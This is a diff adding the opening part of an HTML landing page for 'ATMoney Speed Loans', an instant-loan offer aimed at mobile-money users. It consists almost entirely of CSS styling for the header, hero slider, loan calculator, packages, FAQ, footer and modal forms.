@@ -1,0 +1,1775 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ATMoney Speed Loans | Instant Speed Loans for ATMoney Users</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700;9..144,900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #003DA5;
+      --red-dark: #002D80;
+      --red-deep: #001F5C;
+      --red-light: #1A52B8;
+      --red-pale: #F0F4FF;
+      --red-mist: rgba(0,61,165,.07);
+      --red-border: rgba(0,61,165,.18);
+      --at-red: #E30613;
+      --white: #FFFFFF;
+      --off-white: #F8F9FA;
+      --light-grey: #F0F2F5;
+      --mid-grey: #E4E6EA;
+      --border: #E4E6EA;
+      --text-dark: #0F172A;
+      --text-body: #334155;
+      --text-muted: #64748B;
+      --text-light: #94A3B8;
+      --gold: #F59E0B;
+      --gold-light: #FFFBEB;
+      --green: #059669;
+      --green-light: #ECFDF5;
+      --shadow-sm: 0 1px 6px rgba(0,0,0,.06);
+      --shadow-md: 0 4px 20px rgba(0,0,0,.08);
+      --shadow-lg: 0 12px 48px rgba(0,0,0,.12);
+      --shadow-red: 0 6px 24px rgba(227,6,19,.25);
+      --radius-sm: 10px;
+      --radius-md: 14px;
+      --radius-lg: 20px;
+      --radius-xl: 28px;
+      --font-head: 'Fraunces', serif;
+      --font-body: 'Plus Jakarta Sans', sans-serif;
+    }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+    body {
+      font-family: var(--font-body);
+      background:#fff;
+      color:var(--text-body);
+      overflow-x:hidden;
+      -webkit-font-smoothing:antialiased;
+    }
+    h1,h2,h3,h4,h5 { font-family: var(--font-body); font-weight:700; }
+
+    /* ══ TICKER ══ */
+    .ticker-bar {
+      background:var(--red);
+      padding:9px 0;
+      overflow:hidden;
+      white-space:nowrap;
+    }
+    .ticker-track {
+      display:inline-flex;
+      animation:ticker 38s linear infinite;
+    }
+    .ticker-item {
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:0 28px;
+      font-size:11px;
+      font-weight:700;
+      color:#fff;
+      letter-spacing:.08em;
+      text-transform:uppercase;
+      font-family: var(--font-body);
+    }
+    .ticker-item::after { content:'●'; opacity:.3; margin-left:10px; font-size:6px; }
+    @keyframes ticker { from{transform:translateX(0)} to{transform:translateX(-50%)} }
+
+    /* ══ HEADER ══ */
+    header {
+      position:sticky; top:0; z-index:999;
+      background:rgba(255,255,255,0.97);
+      backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      padding:0 36px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      height:66px;
+      box-shadow:0 2px 16px rgba(0,0,0,.05);
+      gap:12px;
+    }
+    .logo { display:flex; align-items:center; gap:11px; text-decoration:none; flex-shrink:0; }
+    .logo-mark { width:40px; height:40px; flex-shrink:0; }
+    .logo-text-wrap { display:flex; flex-direction:column; line-height:1; }
+    .logo-name {
+      font-family: var(--font-body);
+      font-size:17px; font-weight:800;
+      color:var(--text-dark); letter-spacing:-.3px;
+    }
+    .logo-name span { color:var(--at-red); }
+    .logo-sub { font-size:8px; font-weight:600; color:var(--text-muted); letter-spacing:.18em; text-transform:uppercase; margin-top:3px; }
+    nav { display:flex; align-items:center; gap:2px; flex:1; justify-content:center; }
+    nav a {
+      color:var(--text-muted);
+      text-decoration:none;
+      font-size:13px;
+      font-weight:600;
+      padding:7px 15px;
+      border-radius:8px;
+      transition:all .2s;
+      letter-spacing:-.01em;
+      font-family: var(--font-body);
+      white-space:nowrap;
+    }
+    nav a:hover, nav a.active { color:var(--red); background:var(--red-mist); }
+    .header-right { display:flex; align-items:center; gap:8px; flex-shrink:0; }
+    .btn-login {
+      background:transparent;
+      border:1.5px solid var(--border);
+      color:var(--text-dark);
+      padding:8px 18px;
+      border-radius:var(--radius-sm);
+      font-size:12.5px;
+      font-weight:700;
+      cursor:pointer;
+      font-family: var(--font-body);
+      transition:all .2s;
+      letter-spacing:-.01em;
+      white-space:nowrap;
+    }
+    .btn-login:hover { border-color:var(--red); color:var(--red); }
+    .btn-apply-header {
+      background:var(--red);
+      color:#fff; border:none;
+      padding:9px 20px;
+      border-radius:var(--radius-sm);
+      font-size:12.5px;
+      font-weight:700;
+      cursor:pointer;
+      font-family: var(--font-body);
+      transition:all .2s;
+      letter-spacing:-.01em;
+      box-shadow:var(--shadow-red);
+      white-space:nowrap;
+    }
+    .btn-apply-header:hover { background:var(--red-dark); transform:translateY(-1px); }
+    .hamburger { display:none; flex-direction:column; gap:5px; cursor:pointer; padding:6px; flex-shrink:0; }
+    .hamburger span { display:block; width:22px; height:2px; background:var(--text-dark); border-radius:2px; transition:.3s; }
+    .hamburger.active span:nth-child(1) { transform:rotate(45deg) translate(5px,5px); }
+    .hamburger.active span:nth-child(2) { opacity:0; }
+    .hamburger.active span:nth-child(3) { transform:rotate(-45deg) translate(5px,-5px); }
+
+    .mobile-menu {
+      display:none; position:fixed; top:66px; left:0; right:0;
+      background:#fff; border-bottom:1px solid var(--border);
+      padding:12px 20px 20px; z-index:998; flex-direction:column; gap:2px;
+      box-shadow:var(--shadow-lg);
+    }
+    .mobile-menu.open { display:flex; }
+    .mobile-menu a {
+      color:var(--text-dark); text-decoration:none; padding:12px 14px;
+      border-radius:var(--radius-sm); font-weight:600; font-size:14px;
+      font-family: var(--font-body); transition:.2s;
+    }
+    .mobile-menu a:hover { background:var(--red-mist); color:var(--red); }
+    .mobile-menu-actions { display:flex; gap:8px; margin-top:10px; padding-top:10px; border-top:1px solid var(--border); }
+    .mobile-menu-actions button { flex:1; }
+
+    /* ══ HERO ══ */
+    .hero {
+      position:relative;
+      height:88vh;
+      min-height:560px;
+      max-height:920px;
+      overflow:hidden;
+      background:var(--text-dark);
+    }
+    .slides { position:absolute; inset:0; }
+    .slide {
+      position:absolute; inset:0;
+      opacity:0;
+      transition:opacity 1.2s ease;
+      display:flex; align-items:center;
+    }
+    .slide.active { opacity:1; }
+    .slide-bg {
+      position:absolute; inset:0;
+      background-size:cover;
+      background-position:center;
+      transform:scale(1.04);
+      transition:transform 7s ease;
+    }
+    .slide.active .slide-bg { transform:scale(1); }
+
+    .slide:nth-child(1) .slide-bg { background:linear-gradient(140deg,#0F172A 0%,#001F5C 45%,#003DA5 100%); }
+    .slide:nth-child(2) .slide-bg { background:linear-gradient(125deg,#003DA5 0%,#001F5C 35%,#0F172A 75%); }
+    .slide:nth-child(3) .slide-bg { background:linear-gradient(155deg,#001F5C 0%,#003DA5 45%,#F59E0B 130%); }
+    .slide:nth-child(4) .slide-bg { background:linear-gradient(130deg,#0F172A 0%,#1a2a3a 40%,#003DA5 100%); }
+    .slide:nth-child(5) .slide-bg { background:linear-gradient(145deg,#001F5C 0%,#003DA5 50%,#0F172A 100%); }
+
+    .slide-geo { position:absolute; inset:0; overflow:hidden; pointer-events:none; }
+    .slide-geo::before {
+      content:''; position:absolute; right:-80px; top:-100px;
+      width:460px; height:460px; border-radius:50%;
+      border:70px solid rgba(255,255,255,.03);
+    }
+    .slide-geo::after {
+      content:''; position:absolute; right:60px; bottom:-90px;
+      width:300px; height:300px; border-radius:50%;
+      border:55px solid rgba(255,255,255,.05);
+    }
+    .slide-content {
+      position:relative; z-index:2;
+      padding:0 70px;
+      max-width:720px;
+    }
+    .slide-tag {
+      display:inline-flex; align-items:center; gap:8px;
+      background:rgba(255,255,255,.1);
+      border:1px solid rgba(255,255,255,.2);
+      color:#fff;
+      padding:6px 16px; border-radius:50px;
+      font-size:10.5px; font-weight:700;
+      letter-spacing:.1em; text-transform:uppercase;
+      margin-bottom:22px;
+      font-family: var(--font-body);
+    }
+    .slide-tag .dot { width:5px; height:5px; border-radius:50%; background:var(--gold); animation:pulse 1.6s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(1.9)} }
+
+    .slide h1 {
+      font-size:clamp(42px,6.5vw,82px);
+      font-weight:900;
+      line-height:.96;
+      color:#fff;
+      letter-spacing:-2px;
+      margin-bottom:20px;
+      font-family: var(--font-head);
+    }
+    .slide h1 em { color:var(--gold); font-style:italic; }
+    .slide h1 .thin { font-weight:300; color:rgba(255,255,255,.55); font-style:italic; }
+    .slide p {
+      font-size:clamp(13px,1.5vw,15.5px);
+      color:rgba(255,255,255,.7);
+      line-height:1.75;
+      max-width:460px;
+      margin-bottom:34px;
+      font-weight:400;
+      font-family: var(--font-body);
+    }
+    .slide-btns { display:flex; gap:12px; flex-wrap:wrap; }
+    .btn-hero-primary {
+      background:var(--red); color:#fff; border:none;
+      padding:14px 32px; border-radius:var(--radius-sm);
+      font-size:13px; font-weight:700; cursor:pointer;
+      font-family: var(--font-body);
+      transition:all .25s;
+      box-shadow:0 6px 24px rgba(227,6,19,.45);
+      letter-spacing:.02em;
+      display:inline-flex; align-items:center; gap:7px;
+    }
+    .btn-hero-primary:hover { background:var(--red-dark); transform:translateY(-2px); }
+    .btn-hero-secondary {
+      background:rgba(255,255,255,.1); color:#fff; border:1.5px solid rgba(255,255,255,.25);
+      padding:14px 32px; border-radius:var(--radius-sm);
+      font-size:13px; font-weight:700; cursor:pointer;
+      font-family: var(--font-body);
+      transition:all .25s;
+      display:inline-flex; align-items:center; gap:7px;
+    }
+    .btn-hero-secondary:hover { background:rgba(255,255,255,.18); border-color:rgba(255,255,255,.5); }
+
+    .slide-dots {
+      position:absolute; bottom:30px; left:50%; transform:translateX(-50%);
+      display:flex; gap:7px; z-index:10;
+    }
+    .slide-dot {
+      width:7px; height:7px; border-radius:50%;
+      background:rgba(255,255,255,.3); cursor:pointer; transition:all .3s;
+      border:none; padding:0;
+    }
+    .slide-dot.active { background:#fff; width:26px; border-radius:4px; }
+    .slide-arrow {
+      position:absolute; top:50%; transform:translateY(-50%);
+      width:46px; height:46px; border-radius:50%;
+      background:rgba(255,255,255,.1); border:1.5px solid rgba(255,255,255,.18);
+      color:#fff; font-size:18px; cursor:pointer;
+      display:flex; align-items:center; justify-content:center;
+      z-index:10; transition:all .2s; backdrop-filter:blur(8px);
+    }
+    .slide-arrow:hover { background:var(--red); border-color:var(--red); }
+    .slide-arrow.prev { left:24px; }
+    .slide-arrow.next { right:24px; }
+
+    /* ══ STATS BAR ══ */
+    .stats-bar { background:#fff; border-bottom:1px solid var(--border); box-shadow:var(--shadow-sm); }
+    .stats-bar-inner {
+      max-width:1180px; margin:0 auto;
+      display:grid; grid-template-columns:repeat(4,1fr);
+    }
+    .stat-item {
+      padding:20px 16px; text-align:center;
+      border-right:1px solid var(--border); position:relative;
+    }
+    .stat-item:last-child { border-right:none; }
+    .stat-item::before {
+      content:''; position:absolute; top:0; left:50%; transform:translateX(-50%);
+      width:40px; height:3px; background:var(--red); border-radius:0 0 3px 3px;
+    }
+    .stat-num {
+      font-family: var(--font-body);
+      font-size:28px; font-weight:800; color:var(--red);
+      display:block; line-height:1; letter-spacing:-.5px;
+    }
+    .stat-label { font-size:10.5px; color:var(--text-muted); margin-top:5px; font-weight:600; text-transform:uppercase; letter-spacing:.07em; font-family: var(--font-body); }
+
+    /* ══ SECTION COMMON ══ */
+    section { padding:88px 36px; }
+    .container { max-width:1180px; margin:0 auto; }
+    .text-center { text-align:center; }
+    .text-center .section-sub { margin:0 auto; }
+    .section-tag {
+      display:inline-flex; align-items:center; gap:6px;
+      background:var(--red-pale); border:1.5px solid var(--red-border);
+      color:var(--red);
+      font-size:10px; font-weight:700;
+      padding:4px 13px; border-radius:50px;
+      letter-spacing:.1em; text-transform:uppercase;
+      margin-bottom:14px;
+      font-family: var(--font-body);
+    }
+    .section-tag::before { content:''; width:5px; height:5px; background:var(--red); border-radius:50%; }
+    .section-title {
+      font-size:clamp(30px,4.5vw,48px);
+      font-weight:800; color:var(--text-dark);
+      line-height:1.06; margin-bottom:14px;
+      letter-spacing:-.6px;
+      font-family: var(--font-body);
+    }
+    .section-title span { color:var(--red); }
+    .section-sub { font-size:15px; color:var(--text-muted); max-width:500px; line-height:1.78; font-weight:400; }
+    .accent-bar { width:44px; height:4px; background:var(--red); border-radius:3px; margin:0 auto 20px; }
+
+    /* ══ CALCULATOR ══ */
+    .calc-section { background:var(--off-white); }
+    .calc-wrap { display:grid; grid-template-columns:1fr 1fr; gap:28px; align-items:start; margin-top:48px; }
+
+    .calc-panel {
+      background:#fff; border:1px solid var(--border);
+      border-radius:var(--radius-lg); padding:30px; box-shadow:var(--shadow-md);
+    }
+    .calc-panel-header {
+      display:flex; align-items:center; gap:12px;
+      padding-bottom:22px; border-bottom:1px solid var(--light-grey); margin-bottom:26px;
+    }
+    .calc-panel-icon {
+      width:44px; height:44px; background:var(--red); border-radius:12px;
+      display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0;
+    }
+    .calc-panel-header h3 { font-size:17px; font-weight:700; color:var(--text-dark); font-family: var(--font-body); }
+    .calc-panel-header p { font-size:12px; color:var(--text-muted); margin-top:2px; }
+    .calc-field-label {
+      font-size:10px; font-weight:700; color:var(--text-muted);
+      letter-spacing:.1em; text-transform:uppercase; margin-bottom:9px;
+      font-family: var(--font-body);
+    }
+    .calc-row { margin-bottom:26px; }
+
+    .amount-display-box {
+      background:var(--red-pale); border:1.5px solid var(--red-border);
+      border-radius:var(--radius-md); padding:16px 20px; margin-bottom:14px;
+      display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px;
+    }
+    .amount-big-display {
+      font-family: var(--font-body);
+      font-size:34px; font-weight:800; color:var(--text-dark);
+      letter-spacing:-1px; line-height:1;
+    }
+    .amount-big-display span { color:var(--red); }
+    .amount-manual-input {
+      width:130px; background:#fff;
+      border:1.5px solid var(--border);
+      border-radius:var(--radius-sm);
+      padding:9px 12px; font-size:14px; font-weight:600;
+      color:var(--text-dark); font-family: var(--font-body);
+      outline:none; transition:border-color .2s; text-align:center;
+    }
+    .amount-manual-input:focus { border-color:var(--red); }
+    input[type=range] {
+      width:100%; height:5px; -webkit-appearance:none;
+      background:var(--mid-grey); border-radius:4px; cursor:pointer; outline:none;
+    }
+    input[type=range]::-webkit-slider-thumb {
+      -webkit-appearance:none; width:22px; height:22px; border-radius:50%;
+      background:var(--red); border:3px solid #fff;
+      box-shadow:0 0 0 3px rgba(227,6,19,.18), var(--shadow-sm);
+      cursor:pointer; transition:box-shadow .2s;
+    }
+    input[type=range]::-webkit-slider-thumb:hover { box-shadow:0 0 0 7px rgba(227,6,19,.13), var(--shadow-sm); }
+    .range-labels { display:flex; justify-content:space-between; font-size:10px; color:var(--text-light); margin-top:7px; font-weight:600; font-family: var(--font-body); }
+    .quick-chips { display:flex; flex-wrap:wrap; gap:7px; margin-top:13px; }
+    .chip {
+      background:var(--light-grey); border:1.5px solid var(--border);
+      color:var(--text-body); padding:7px 14px; border-radius:8px;
+      font-size:12px; font-weight:600; cursor:pointer; transition:all .2s;
+      font-family: var(--font-body);
+    }
+    .chip:hover { border-color:var(--red-border); color:var(--red); }
+    .chip.active { background:var(--red); color:#fff; border-color:var(--red); }
+
+    .calc-results {
+      background:var(--text-dark); border-radius:var(--radius-lg);
+      padding:30px; color:#fff; box-shadow:var(--shadow-lg);
+    }
+    .results-header { margin-bottom:24px; padding-bottom:18px; border-bottom:1px solid rgba(255,255,255,.1); }
+    .results-header h3 { font-size:16px; color:#fff; margin-bottom:5px; font-family: var(--font-body); }
+    .results-header p { font-size:11.5px; color:rgba(255,255,255,.45); }
+    .res-row { display:flex; align-items:center; gap:14px; margin-bottom:20px; }
+    .res-icon { width:38px; height:38px; border-radius:10px; background:rgba(255,255,255,.07); display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
+    .res-info { flex:1; }
+    .res-label { font-size:10px; color:rgba(255,255,255,.4); text-transform:uppercase; letter-spacing:.08em; font-weight:700; margin-bottom:2px; font-family: var(--font-body); }
+    .res-val { font-size:18px; font-weight:800; color:#fff; font-family: var(--font-body); }
+    .res-val span { font-size:12px; font-weight:500; color:rgba(255,255,255,.5); margin-left:5px; }
+    .res-total { background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.1); border-radius:var(--radius-md); padding:18px; margin:24px 0; }
+    .res-total .res-val { font-size:24px; color:var(--gold); }
+    .btn-calc-apply {
+      width:100%; background:var(--red); color:#fff; border:none;
+      padding:16px; border-radius:var(--radius-sm); font-size:14px; font-weight:700;
+      cursor:pointer; font-family: var(--font-body); transition:all .25s;
+      box-shadow:var(--shadow-red); display:flex; align-items:center; justify-content:center; gap:8px;
+    }
+    .btn-calc-apply:hover { background:var(--red-dark); transform:translateY(-2px); }
+    .calc-warning { display:flex; gap:10px; margin-top:18px; padding:12px; background:rgba(245,158,11,.08); border-radius:8px; border:1px solid rgba(245,158,11,.2); }
+    .calc-warning span { font-size:15px; }
+    .calc-warning p { font-size:10.5px; color:rgba(255,255,255,.6); line-height:1.55; }
+    .calc-warning p strong { color:var(--gold); }
+
+    /* ══ LOAN PACKAGES ══ */
+    .loans-section { background:#fff; }
+    .loans-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:22px; margin-top:48px; }
+    .loan-card {
+      background:#fff; border:1.5px solid var(--border);
+      border-radius:var(--radius-lg); padding:32px 28px;
+      transition:all .3s ease; position:relative;
+      display:flex; flex-direction:column;
+    }
+    .loan-card:hover { border-color:var(--red); transform:translateY(-8px); box-shadow:var(--shadow-lg); }
+    .loan-card.popular { border-color:var(--red); background:var(--red-pale); box-shadow:var(--shadow-md); }
+    .popular-badge {
+      position:absolute; top:-12px; left:50%; transform:translateX(-50%);
+      background:var(--red); color:#fff; padding:4px 14px; border-radius:50px;
+      font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:.1em;
+      box-shadow:var(--shadow-red);
+    }
+    .loan-icon { font-size:32px; margin-bottom:18px; }
+    .loan-name { font-size:18px; font-weight:800; color:var(--text-dark); margin-bottom:4px; font-family: var(--font-body); }
+    .loan-amount { font-size:32px; font-weight:900; color:var(--red); margin-bottom:12px; letter-spacing:-1px; font-family: var(--font-body); }
+    .loan-period-tag { display:inline-block; background:var(--mid-grey); color:var(--text-dark); padding:4px 10px; border-radius:6px; font-size:11px; font-weight:700; margin-bottom:22px; }
+    .loan-card.popular .loan-period-tag { background:rgba(0,61,165,.15); }
+    .loan-features { margin-bottom:28px; border-top:1px solid var(--light-grey); padding-top:20px; }
+    .loan-feat { display:flex; justify-content:space-between; margin-bottom:10px; font-size:12.5px; }
+    .loan-feat-label { color:var(--text-muted); font-weight:500; }
+    .loan-feat-val { color:var(--text-dark); font-weight:700; }
+    .loan-select-btn {
+      width:100%; background:transparent; border:1.5px solid var(--border);
+      color:var(--text-dark); padding:13px; border-radius:var(--radius-sm);
+      font-size:13px; font-weight:700; cursor:pointer;
+      font-family: var(--font-body); transition:all .2s;
+      margin-top:auto;
+    }
+    .loan-card:hover .loan-select-btn,
+    .loan-card.popular .loan-select-btn {
+      background:var(--red); border-color:var(--red); color:#fff; box-shadow:var(--shadow-red);
+    }
+
+    /* ══ HOW IT WORKS ══ */
+    .how-section { background:var(--off-white); }
+    .steps-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:22px; margin-top:48px; position:relative; }
+    .step-connector {
+      position:absolute; top:50px; left:calc(16.67% + 14px); right:calc(16.67% + 14px);
+      height:2px; background:linear-gradient(90deg, var(--red) 0%, rgba(227,6,19,.2) 50%, var(--red) 100%);
+      z-index:0;
+    }
+    .step-card {
+      background:#fff; border:1px solid var(--border);
+      border-radius:var(--radius-lg); padding:32px 26px; text-align:center;
+      position:relative; z-index:1; transition:all .3s;
+    }
+    .step-card:hover { border-color:var(--red); transform:translateY(-5px); box-shadow:var(--shadow-lg); }
+    .step-num {
+      width:54px; height:54px; background:var(--red); border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-family: var(--font-body); font-size:22px; font-weight:800; color:#fff;
+      margin:0 auto 20px;
+      box-shadow:0 0 0 8px rgba(227,6,19,.09), var(--shadow-red);
+    }
+    .step-card h3 { font-size:17px; font-weight:700; color:var(--text-dark); margin-bottom:9px; font-family: var(--font-body); }
+    .step-card p { font-size:13px; color:var(--text-muted); line-height:1.75; }
+
+    /* ══ ELIGIBILITY ══ */
+    .eligibility-strip { background:var(--red); padding:32px 36px; }
+    .eligibility-inner { max-width:1180px; margin:0 auto; display:flex; align-items:center; gap:22px; flex-wrap:wrap; }
+    .eligibility-icon-big { font-size:42px; flex-shrink:0; }
+    .eligibility-copy { flex:1; }
+    .eligibility-copy h3 { font-size:24px; font-weight:800; color:#fff; font-family: var(--font-body); margin-bottom:6px; }
+    .eligibility-copy p { font-size:13.5px; color:rgba(255,255,255,.82); line-height:1.68; max-width:600px; }
+    .eligibility-cta {
+      background:#fff; color:var(--red); border:none;
+      padding:13px 28px; border-radius:var(--radius-sm);
+      font-size:13px; font-weight:700; cursor:pointer;
+      font-family: var(--font-body); transition:all .2s;
+      white-space:nowrap;
+    }
+    .eligibility-cta:hover { background:var(--gold); color:#111; }
+
+    /* ══ BENEFITS ══ */
+    .benefits-section { background:#fff; }
+    .benefits-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin-top:48px; }
+    .benefit-card {
+      background:var(--off-white); border:1px solid var(--border);
+      border-radius:var(--radius-md); padding:26px; transition:all .28s;
+    }
+    .benefit-card:hover { border-color:var(--red); background:#fff; transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .benefit-icon-wrap {
+      width:48px; height:48px; border-radius:12px; background:var(--red);
+      display:flex; align-items:center; justify-content:center; font-size:20px; margin-bottom:16px;
+      box-shadow:0 3px 12px rgba(227,6,19,.28);
+    }
+    .benefit-card h3 { font-size:15px; font-weight:700; color:var(--text-dark); margin-bottom:7px; font-family: var(--font-body); }
+    .benefit-card p { font-size:12.5px; color:var(--text-muted); line-height:1.75; }
+
+    /* ══ REVIEWS ══ */
+    .reviews-section { background:var(--off-white); }
+    .reviews-track-wrap { overflow:hidden; margin-top:48px; }
+    .reviews-track { display:flex; gap:18px; animation:scrollReviews 40s linear infinite; width:max-content; }
+    .reviews-track:hover { animation-play-state:paused; }
+    .review-card {
+      background:#fff; border:1px solid var(--border);
+      border-radius:var(--radius-md); padding:24px; transition:all .2s;
+      flex:0 0 310px; width:310px;
+    }
+    .review-card:hover { border-color:var(--red-border); box-shadow:var(--shadow-md); }
+    @keyframes scrollReviews { from{transform:translateX(0)} to{transform:translateX(-50%)} }
+    .stars { color:var(--gold); font-size:13px; margin-bottom:13px; letter-spacing:2px; }
+    .review-text { font-size:13px; color:var(--text-body); line-height:1.75; margin-bottom:16px; font-family: var(--font-body); }
+    .reviewer { display:flex; align-items:center; gap:10px; padding-top:14px; border-top:1px solid var(--light-grey); }
+    .avatar {
+      width:40px; height:40px; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-weight:800; font-size:12px; color:#fff; flex-shrink:0;
+      font-family: var(--font-body);
+    }
+    .reviewer-name { font-weight:700; font-size:13px; color:var(--text-dark); font-family: var(--font-body); }
+    .reviewer-role { font-size:11px; color:var(--text-muted); margin-top:2px; font-weight:500; }
+
+    /* ══ FAQ ══ */
+    .faq-section { background:#fff; }
+    .faq-wrap { max-width:740px; margin:48px auto 0; }
+    .faq-item { border:1px solid var(--border); border-radius:var(--radius-md); margin-bottom:9px; overflow:hidden; background:#fff; transition:border-color .2s; }
+    .faq-item.open { border-color:var(--red); }
+    .faq-q { padding:18px 22px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; gap:14px; }
+    .faq-q span { font-weight:600; font-size:14px; color:var(--text-dark); line-height:1.4; font-family: var(--font-body); }
+    .faq-icon {
+      width:28px; height:28px; flex-shrink:0; border-radius:50%;
+      background:var(--light-grey); display:flex; align-items:center; justify-content:center;
+      font-size:17px; color:var(--text-muted); transition:all .3s; font-weight:900;
+    }
+    .faq-item.open .faq-q span { color:var(--red); }
+    .faq-item.open .faq-icon { background:var(--red); color:#fff; transform:rotate(45deg); }
+    .faq-a { max-height:0; overflow:hidden; transition:max-height .35s ease, padding .35s ease; padding:0 22px; font-size:13.5px; color:var(--text-muted); line-height:1.78; font-family: var(--font-body); }
+    .faq-item.open .faq-a { max-height:280px; padding:0 22px 20px; }
+
+    /* ══ BRAND STRIP ══ */
+    .brand-strip { background:var(--text-dark); padding:16px 36px; text-align:center; }
+    .brand-strip p { font-family: var(--font-body); font-size:11.5px; font-weight:600; color:rgba(255,255,255,.35); letter-spacing:.12em; text-transform:uppercase; }
+    .brand-strip p span { color:var(--red); }
+
+    /* ══ FOOTER ══ */
+    footer { background:var(--text-dark); border-top:3px solid var(--red); padding:68px 36px 34px; }
+    .footer-grid { display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:44px; margin-bottom:48px; }
+    .footer-desc { font-size:12.5px; color:rgba(255,255,255,.38); line-height:1.78; margin-top:14px; max-width:230px; font-family: var(--font-body); }
+    .footer-col h4 { font-size:10.5px; font-weight:700; color:#fff; margin-bottom:16px; letter-spacing:.12em; text-transform:uppercase; font-family: var(--font-body); }
+    .footer-col a { display:block; color:rgba(255,255,255,.38); text-decoration:none; font-size:12.5px; margin-bottom:10px; transition:.2s; font-family: var(--font-body); cursor:default; }
+    .footer-col a:hover { color:rgba(255,255,255,.7); }
+    .footer-bottom { display:flex; justify-content:space-between; align-items:center; padding-top:22px; border-top:1px solid rgba(255,255,255,.07); flex-wrap:wrap; gap:10px; }
+    .footer-bottom p { font-size:11.5px; color:rgba(255,255,255,.28); font-family: var(--font-body); }
+    .footer-disclaimer { font-size:10.5px; color:rgba(255,255,255,.2); margin-top:16px; line-height:1.68; padding-top:16px; border-top:1px solid rgba(255,255,255,.05); font-family: var(--font-body); }
+
+    /* ══ MODALS ══ */
+    .modal-overlay {
+      display:none; position:fixed; inset:0; z-index:2000;
+      background:rgba(0,0,0,.65); backdrop-filter:blur(12px);
+      align-items:center; justify-content:center; padding:16px;
+    }
+    .modal-overlay.open { display:flex; }
+    .modal {
+      background:#fff; border:1px solid var(--border);
+      border-radius:var(--radius-xl);
+      width:100%; max-width:480px; max-height:92vh; overflow-y:auto;
+      animation:slideUp .3s ease; box-shadow:var(--shadow-lg);
+    }
+    @keyframes slideUp { from{transform:translateY(28px);opacity:0} to{transform:translateY(0);opacity:1} }
+    .modal-header {
+      padding:26px 26px 0; display:flex; justify-content:space-between; align-items:center;
+      border-bottom:1px solid var(--light-grey); margin-bottom:22px; padding-bottom:20px;
+    }
+    .modal-header-left { display:flex; align-items:center; gap:12px; }
+    .modal-header-icon { width:42px; height:42px; background:var(--red); border-radius:11px; display:flex; align-items:center; justify-content:center; font-size:19px; }
+    .modal-header h2 { font-size:20px; font-weight:700; color:var(--text-dark); font-family: var(--font-body); }
+    .modal-close {
+      width:34px; height:34px; background:var(--light-grey); border:none;
+      border-radius:50%; color:var(--text-muted); cursor:pointer; font-size:14px;
+      display:flex; align-items:center; justify-content:center; transition:.2s; font-weight:900;
+    }
+    .modal-close:hover { background:var(--red); color:#fff; }
+    .modal-body { padding:0 26px 26px; }
+    .modal-sub { font-size:13px; color:var(--text-muted); margin-bottom:20px; line-height:1.65; font-family: var(--font-body); }
+    .input-wrap { margin-bottom:15px; }
+    .input-wrap label { display:block; font-size:10px; font-weight:700; color:var(--text-muted); margin-bottom:7px; letter-spacing:.1em; text-transform:uppercase; font-family: var(--font-body); }
+    .modal-input {
+      width:100%; background:var(--off-white); border:1.5px solid var(--border);
+      border-radius:var(--radius-sm); padding:12px 14px; color:var(--text-dark); font-size:14px;
+      font-family: var(--font-body); outline:none; transition:border-color .2s; font-weight:500;
+    }
+    .modal-input:focus { border-color:var(--red); background:#fff; }
+    .modal-input::placeholder { color:var(--text-light); font-weight:400; }
+    .modal-btn {
+      width:100%; margin-top:6px; background:var(--red); color:#fff; border:none;
+      padding:15px; border-radius:var(--radius-sm); font-size:13.5px; font-weight:700;
+      cursor:pointer; font-family: var(--font-body); transition:all .25s;
+      box-shadow:var(--shadow-red);
+    }
+    .modal-btn:hover { background:var(--red-dark); }
+    .modal-note { font-size:11px; color:var(--text-light); text-align:center; margin-top:13px; line-height:1.68; font-family: var(--font-body); }
+    .modal-note a { color:var(--red); text-decoration:none; font-weight:600; }
+
+    .confirm-summary {
+      background:var(--off-white); border-radius:var(--radius-md);
+      padding:4px 18px; margin:16px 0; border:1px solid var(--border);
+    }
+    .loan-detail-row {
+      display:flex; justify-content:space-between; align-items:center;
+      padding:12px 0; border-bottom:1px solid var(--light-grey);
+    }
+    .loan-detail-row:last-child { border-bottom:none; }
+    .loan-detail-label { font-size:11.5px; color:var(--text-muted); font-weight:600; text-transform:uppercase; letter-spacing:.04em; font-family: var(--font-body); }
+    .loan-detail-value { font-size:15px; font-weight:800; color:var(--text-dark); font-family: var(--font-body); }
+    .loan-detail-value.red { color:var(--red); }
+    .loan-detail-value.green { color:var(--green); }
+
+    /* Eligibility badge in modal */
+    .eligibility-info-box {
+      background:var(--green-light); border:1.5px solid #A7F3D0;
+      border-radius:var(--radius-sm); padding:12px 16px; margin-bottom:18px;
+      display:flex; gap:10px; align-items:flex-start;
+    }
+    .eligibility-info-box .ei-icon { font-size:16px; flex-shrink:0; margin-top:1px; }
+    .eligibility-info-box .ei-text { font-size:12px; color:#065F46; line-height:1.65; font-weight:600; font-family: var(--font-body); }
+
+    /* ══ TOAST ══ */
+    .toast {
+      position:fixed; bottom:26px; right:26px; z-index:9999;
+      background:#fff; border:1px solid var(--border);
+      border-radius:var(--radius-md); padding:15px 20px;
+      display:flex; align-items:center; gap:11px;
